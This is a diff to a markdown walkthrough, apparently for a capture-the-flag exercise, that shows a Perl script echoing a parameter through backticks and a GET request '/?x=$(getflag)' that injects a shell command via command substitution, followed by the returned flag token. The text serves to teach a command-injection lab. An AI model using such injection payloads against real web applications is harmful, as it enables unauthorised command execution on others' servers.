@@ -23,9 +23,12 @@ print \`echo $y 2>&1\`;
     ```
     - send get request with command as parameter
     ```
-    - GET /?x=$(getflag)
+    GET /?x=$(getflag)
     ```
-
+    - output
+    ```
+    Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+    ```
 
 ## Ressources
 - [command substitution](https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html)
